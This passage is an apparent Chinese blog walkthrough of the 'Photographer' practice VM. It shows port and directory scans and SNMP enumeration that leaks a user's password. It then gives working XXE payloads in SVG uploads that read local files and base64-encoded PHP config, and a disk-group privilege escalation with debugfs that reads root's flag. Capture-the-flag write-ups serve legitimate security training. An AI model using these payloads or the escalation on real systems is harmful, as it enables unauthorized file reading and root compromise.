Nmap 7.95 ( https://nmap.org ) at 2026-01-29 01:33 EST</span><br><span class="line">NSE: Loaded 47 scripts for scanning.</span><br><span class="line">Initiating ARP Ping Scan at 01:33</span><br><span class="line">Scanning 10.10.139.236 [1 port]</span><br><span class="line">Completed ARP Ping Scan at 01:33, 0.03s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 01:33</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 01:33, 0.01s elapsed</span><br><span class="line">DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br><span class="line">Initiating SYN Stealth Scan at 01:33</span><br><span class="line">Scanning 10.10.139.236 [2 ports]</span><br><span class="line">Discovered open port 80/tcp on 10.10.139.236</span><br><span class="line">Discovered open port 22/tcp on 10.10.139.236</span><br><span class="line">Completed SYN Stealth Scan at 01:33, 0.02s elapsed (2 total ports)</span><br><span class="line">Initiating Service scan at 01:33</span><br><span class="line">Scanning 2 services on 10.10.139.236</span><br><span class="line">Completed Service scan at 01:33, 7.61s elapsed (2 services on 1 host)</span><br><span class="line">NSE: Script scanning 10.10.139.236.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 01:33</span><br><span class="line">Completed NSE at 01:33, 0.01s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 01:33</span><br><span class="line">Completed NSE at 01:33, 0.01s elapsed</span><br><span class="line">Nmap scan report for 10.10.139.236</span><br><span class="line">Host is up, received arp-response (0.00059s latency).</span><br><span class="line">Scanned at 2026-01-29 01:33:25 EST for 8s</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)</span><br><span class="line">80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.65 ((Debian))</span><br><span class="line">MAC Address: 08:00:27:1A:71:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</span><br><span class="line">           Raw packets sent: 3 (116B) | Rcvd: 4 (160B)</span><br></pre></td></tr></table></figure>
 
 <p>开放了22&#x2F;80端口 接着使用nmap 对UDP进行端口扫描:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -T5 -p- --min-parallelism 256 --max-rtt-timeout 300ms --initial-rtt-timeout 100ms --min-rate 500 --disable-arp-ping -n 192.168.8.236          ─╯</span><br><span class="line">Warning: Your --min-parallelism option is pretty high!  This can hurt reliability.</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 23:08 EST</span><br><span class="line">Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 3.83% done; ETC: 23:08 (0:00:25 remaining)</span><br><span class="line">Warning: 192.168.8.236 giving up on port because retransmission cap hit (2).</span><br><span class="line">Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 11.02% done; ETC: 23:08 (0:00:32 remaining)</span><br><span class="line">Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 49.21% done; ETC: 23:09 (0:00:41 remaining)</span><br><span class="line">Stats: 0:02:31 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 77.69% done; ETC: 23:11 (0:00:44 remaining)</span><br><span class="line">Stats: 0:02:45 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 81.20% done; ETC: 23:11 (0:00:38 remaining)</span><br><span class="line">Stats: 0:02:46 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 81.52% done; ETC: 23:11 (0:00:38 remaining)</span><br><span class="line">Stats: 0:02:51 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 82.57% done; ETC: 23:11 (0:00:36 remaining)</span><br><span class="line">Stats: 0:03:00 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 84.90% done; ETC: 23:11 (0:00:32 remaining)</span><br><span class="line">Stats: 0:03:45 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 96.41% done; ETC: 23:12 (0:00:08 remaining)</span><br><span class="line">Nmap scan report for 192.168.8.236</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65289 open|filtered udp ports (no-response), 245 closed udp ports (port-unreach)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">161/udp open  snmp</span><br><span class="line">MAC Address: 08:00:27:1A:71:FD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 239.98 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -55,7 +236,7 @@ IconifyProviders = {
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> dirsearch -u &quot;http://192.168.8.236&quot;                                                                                                                                          ─╯</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/Desktop/reports/http_192.168.8.236/_26-02-04_22-56-58.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.8.236/</span><br><span class="line"></span><br><span class="line">[22:56:58] Starting: </span><br><span class="line">[22:56:59] 403 -  278B  - /.ht_wsr.txt                                      </span><br><span class="line">[22:56:59] 403 -  278B  - /.htaccess.orig                                   </span><br><span class="line">[22:56:59] 403 -  278B  - /.htaccess.bak1</span><br><span class="line">[22:56:59] 403 -  278B  - /.htaccess.save                                   </span><br><span class="line">[22:56:59] 403 -  278B  - /.htaccess_extra                                  </span><br><span class="line">[22:56:59] 403 -  278B  - /.htaccess_orig</span><br><span class="line">[22:56:59] 403 -  278B  - /.htaccess_sc</span><br><span class="line">[22:56:59] 403 -  278B  - /.htaccessBAK</span><br><span class="line">[22:56:59] 403 -  278B  - /.htaccessOLD</span><br><span class="line">[22:56:59] 403 -  278B  - /.htaccessOLD2</span><br><span class="line">[22:56:59] 403 -  278B  - /.html                                            </span><br><span class="line">[22:56:59] 403 -  278B  - /.htm</span><br><span class="line">[22:56:59] 403 -  278B  - /.htpasswds                                       </span><br><span class="line">[22:56:59] 403 -  278B  - /.httr-oauth</span><br><span class="line">[22:56:59] 403 -  278B  - /.php                                             </span><br><span class="line">[22:57:01] 200 -    1KB - /about.html                                       </span><br><span class="line">[22:57:01] 301 -  314B  - /admin  -&gt;  http://192.168.8.236/admin/           </span><br><span class="line">[22:57:01] 403 -  278B  - /.htaccess.sample                                 </span><br><span class="line">[22:57:01] 403 -  278B  - /.htpasswd_test                                   </span><br><span class="line">[22:57:01] 302 -    1KB - /admin/admin.php  -&gt;  index.php                   </span><br><span class="line">[22:57:01] 200 -  536B  - /admin/                                           </span><br><span class="line">[22:57:02] 200 -  536B  - /admin/index.php                                  </span><br><span class="line">[22:57:02] 500 -    0B  - /admin/upload.php                                 </span><br><span class="line">[22:57:04] 301 -  315B  - /assets  -&gt;  http://192.168.8.236/assets/         </span><br><span class="line">[22:57:04] 200 -  474B  - /assets/</span><br><span class="line">[22:57:04] 200 -  474B  - /db.php </span><br><span class="line">[22:57:08] 200 -  528B  - /images/                                          </span><br><span class="line">[22:57:08] 301 -  315B  - /images  -&gt;  http://192.168.8.236/images/         </span><br><span class="line">[22:57:13] 403 -  278B  - /server-status                                    </span><br><span class="line">[22:57:13] 403 -  278B  - /server-status/                                   </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed                                        </span><br></pre></td></tr></table></figure>
 
 <p>打开登录页面:</p>
-<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image.png" class="" loading="lazy">
+<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image.png" class="">
 
 <p>尝试弱口令无果 接下来我们把目光放到SNMP服务上 在此之前先介绍一下SNMP服务：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.SNMP = 简单网络管理协议，用于交换机、服务器等设备的监控。</span><br><span class="line">2.一个设备有大量 OID，每个 OID 对应一项数据（如主机名、CPU、端口）</span><br><span class="line">3.社区字符串是 SNMP 的 “密码”，分为：</span><br><span class="line">只读（ro）：默认 public，只能查询信息  ro只开放小部分信息</span><br><span class="line">读写（rw）：默认 private，既能查询又能修改配置 rw会开放整个MIB 拿到更多数据信息</span><br><span class="line">4.MIB（Management Information Base）是 SNMP 的数据结构与字典，定义了所有可管理的数据项（OID）及其含义、类型、访问权限，我们通过 OID 从 MIB 中读取 / 写入数据（如主机名、CPU、端口、用户等），一个 OID 对应一项数据  没有社区字符串无法访问MIB</span><br></pre></td></tr></table></figure>
@@ -76,7 +257,7 @@ IconifyProviders = {
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> cat Photograther | grep &quot;ethan&quot;                                                                                                                                              ─╯</span><br><span class="line">iso.3.6.1.4.1.8072.1.3.2.2.1.3.7.109.121.99.114.101.100.115 = STRING: &quot;/home/ethan/creds.txt&quot;</span><br><span class="line">iso.3.6.1.4.1.8072.1.3.2.3.1.1.7.109.121.99.114.101.100.115 = STRING: &quot;ethan:1N3qVgwNB6cZmNSyr8iX$!&quot;</span><br><span class="line">iso.3.6.1.4.1.8072.1.3.2.3.1.2.7.109.121.99.114.101.100.115 = STRING: &quot;ethan:1N3qVgwNB6cZmNSyr8iX$!&quot;</span><br><span class="line">iso.3.6.1.4.1.8072.1.3.2.4.1.2.7.109.121.99.114.101.100.115.1 = STRING: &quot;ethan:1N3qVgwNB6cZmNSyr8iX$!&quot;</span><br></pre></td></tr></table></figure>
 
 <p>成功拿到凭证 接下来登录网站后台</p>
-<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_1.png" class="" loading="lazy">
+<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_1.png" class="">
 
 <p>思路是文件上传利用 抓个包:</p>
 <p>php不被允许上传 这下尝试svg是否能利用成功:</p>
@@ -84,7 +265,7 @@ IconifyProviders = {
 <p>原理:</p>
 <p>SVG是基于XML的矢量图，可以支持Entity(实体)功能，因此可以用来XXE</p>
 <p>查看&#x2F;etc&#x2F;passwd获得&#x2F;ethan账户 插线ethan下的flag：</p>
-<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_2.png" class="" loading="lazy">
+<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_2.png" class="">
 
 <p>payload:</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.8.236</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----geckoformboundary1f2f4120ab96aec0da0e7cf9676050c3</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>336</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.8.236</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.8.236/admin/admin.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=4r9a09vtgcc1v372f8if6blrlp</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"></span><br><span class="line"><span class="language-xml">------geckoformboundary1f2f4120ab96aec0da0e7cf9676050c3</span></span><br><span class="line"><span class="language-xml">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.svg&quot;</span></span><br><span class="line"><span class="language-xml">Content-Type: image/svg+xml</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///home/ethan/user.txt&#x27;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">------geckoformboundary1f2f4120ab96aec0da0e7cf9676050c3--</span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure>
@@ -93,68 +274,72 @@ IconifyProviders = {
 <?xml version="1.0" standalone="no"?><!DOCTYPE svg [<!ENTITY test SYSTEM 'php://filter/read=convert.base64-encode/resource=db.php'><p>]&gt;<svg>&test;</svg></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJGhvc3QgPSAibG9jYWxob3N0IjsKJGRiID0gImJsb2ciOwokdXNlciA9ICJyb290IjsKJHBhc3MgPSAicGp0RjA1MzNPUGlTTVFUR1phY1pZNmp5JCI7CgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c2VyLCAkcGFzcywgJGRiKTsKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbmV4acOzbiBmYWxsaWRhOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9Cg==</span><br></pre></td></tr></table></figure>
 
-<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_3.png" class="" loading="lazy">
+<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_3.png" class="">
 
 <p>这里的密码就是ethan的凭证:</p>
 <p>接下来我们即可ssh到靶机上 进行提权操作</p>
 <h2 id="三-权限提升"><a href="#三-权限提升" class="headerlink" title="三.权限提升:"></a>三.权限提升:</h2><p>经过一番信息收集后 我们看到当前用户属于disk组  因此想到disk提权 </p>
-<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_4.png" class="" loading="lazy">
+<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_4.png" class="">
 
 <h5 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h5><p>disk 组权限：<br>该组成员可读写 &#x2F;dev&#x2F;sd<em>、&#x2F;dev&#x2F;nvme</em> 等块设备文件（如 &#x2F;dev&#x2F;sda1）。因此通过直接访问磁盘设备，可绕过文件系统权限检查，直接读取或修改磁盘数据。</p>
 <p>使用debugfs   &#x2F;dev&#x2F;sda1  进行调试模式 接着输入cat &#x2F;root&#x2F;root.txt</p>
-<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_5.png" class="" loading="lazy">
+<img src="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/image_5.png" class="">
 
 <p>root flag:dc54639c5bd88637cc23dd7dd1827bbf</p>
-</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>K1r1t5u6u</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/" title="THL靶机--Photographer">https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Securitrona/" rel="prev" title="THL靶机--Securitrona"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">THL靶机--Securitrona</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2026/06/29/vulnhub%E9%9D%B6%E6%9C%BA--Jarbas/" rel="next" title="vulnhub靶机--Jarbas"><span class="post-nav-text">vulnhub靶机--Jarbas</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><style>.utterances {
-  max-width: 100%;
-}</style><script src="https://utteranc.es/client.js" repo="web218/web218.github.io" issue-term="pathname" label="comment" theme="github-light" crossorigin="anonymous" async></script><script>(function() {
-  var themes = { dark: 'github-dark', light: 'github-light' };
-  function setTheme(theme, retries) {
-    retries = retries || 0;
-    var frame = document.querySelector('.utterances-frame');
-    if (!frame) return;
-    try {
-      frame.contentWindow.postMessage({ type: 'set-theme', theme: theme }, 'https://utteranc.es');
-    } catch(e) {
-      if (retries < 10) setTimeout(function() { setTheme(theme, retries + 1) }, 300);
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://web218.github.io">K1r1t5u6u</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/">https://web218.github.io/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Photographer/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://web218.github.io" target="_blank">K1r1t5u6uのHexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/THL/">THL</a><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a></div><div class="post-share"><div class="social-share" data-image="/images/wgqs.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Securitrona/" title="THL靶机--Securitrona"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">THL靶机--Securitrona</div></div><div class="info-2"><div class="info-item-1">一.主机发现和信息收集1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253rustscan -a 192.168.8.192 --ulimit=5000 -- -sV                                                                                                                               ─╯.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| || .-. \| &#123;_&#125; |.-._&#12...</div></div></div></a><a class="pagination-related" href="/2026/06/29/vulnhub%E9%9D%B6%E6%9C%BA--Jarbas/" title="vulnhub靶机--Jarbas"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">vulnhub靶机--Jarbas</div></div><div class="info-2"><div class="info-item-1">一.主机发现和信息收集：12345678910111213141516171819202122232425262728293031323334353637383940414243444546╭─ /home/kali/Desktop/RedTeamNote/Jarbas ··········· х INT with root@kali at 21:53:16 ─╮╰─❯ nmap -sn 192.168.0.0/24                                                           ─╯Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-04 21:53 EDTNmap scan report for 192.168.0.1Host is up (0.0054s latency).MAC Address: 48:7D:2E:DE:45:22 (TP-Link Technologies)Nmap scan report for 192.168.0.103Host is up (0.0...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/06/29/THL%E9%9D%B6%E6%9C%BA--Securitrona/" title="THL靶机--Securitrona"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-29</div><div class="info-item-2">THL靶机--Securitrona</div></div><div class="info-2"><div class="info-item-1">一.主机发现和信息收集1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253rustscan -a 192.168.8.192 --ulimit=5000 -- -sV                                                                                                                               ─╯.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| || .-. \| &#123;_&#125; |.-._&#12...</div></div></div></a><a class="pagination-related" href="/2026/06/29/vulnhub%E9%9D%B6%E6%9C%BA--W1R3S-1.0.1/" title="vulnhub靶机--W1R3S-1.0.1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-29</div><div class="info-item-2">vulnhub靶机--W1R3S-1.0.1</div></div><div class="info-2"><div class="info-item-1">一.主机发现和信息收集1234567891011121314╭─ /home/kali/Desktop ························································································································· х INT with root@kali at 21:08:18 ─╮╰─❯ nmap -sT --min-rate 10000 -p- 192.168.0.101 -oA ports.nmap                                                                                                                   ─╯Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 21:25 EDTNmap scan report for 192.168.0.101Host is up (...</div></div></div></a><a class="pagination-related" href="/2026/07/22/Vulnhub%E9%9D%B6%E6%9C%BA--LAMPSecurity%20CTF5/" title="Vulnhub靶机--LAMPSecurity CTF5"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-22</div><div class="info-item-2">Vulnhub靶机--LAMPSecurity CTF5</div></div><div class="info-2"><div class="info-item-1">Vulnhub靶机–LAMPSecurity CTF5一.主机发现和信息收集123456789101112131415╭─ /home/kali ·································· х INT with root@kali at 08:58:55 ─╮╰─❯ nmap -sn 192.168.67.0/24                                                      ─╯Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-21 08:58 EDTNmap scan report for 192.168.67.50Host is up (0.00017s latency).MAC Address: 70:08:94:2E:B7:41 (Unknown)Nmap scan report for 192.168.67.83Host is up (0.022s latency).MAC Address: 86:24:23:7D:AC:BA (Unknown)N...</div></div></div></a><a class="pagination-related" href="/2026/06/29/vulnhub%E9%9D%B6%E6%9C%BA--Jarbas/" title="vulnhub靶机--Jarbas"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-06-29</div><div class="info-item-2">vulnhub靶机--Jarbas</div></div><div class="info-2"><div class="info-item-1">一.主机发现和信息收集：12345678910111213141516171819202122232425262728293031323334353637383940414243444546╭─ /home/kali/Desktop/RedTeamNote/Jarbas ··········· х INT with root@kali at 21:53:16 ─╮╰─❯ nmap -sn 192.168.0.0/24                                                           ─╯Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-04 21:53 EDTNmap scan report for 192.168.0.1Host is up (0.0054s latency).MAC Address: 48:7D:2E:DE:45:22 (TP-Link Technologies)Nmap scan report for 192.168.0.103Host is up (0.0...</div></div></div></a><a class="pagination-related" href="/2026/07/05/Vulnhub%E9%9D%B6%E6%9C%BA--Prime/" title="Vulnhub靶机--Prime"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-05</div><div class="info-item-2">Vulnhub靶机--Prime</div></div><div class="info-2"><div class="info-item-1">Vulnhub靶机–Prime一.主机发现和信息收集12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970╭─ /home/kali/Desktop  with root@kali at 22:25:31 ─╮╰─❯ nmap -sn 192.168.8.0/24                     Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-29 22:25 EDTNmap scan report for 192.168.8.1 (192.168.8.1)Host is up (0.0066s latency).MAC Address: 14:D8:64:93:00:07 (TP-Link Technologies)Nmap scan report for 192.168.8.3 (192.168.8.3)Hos...</div></div></div></a><a class="pagination-related" 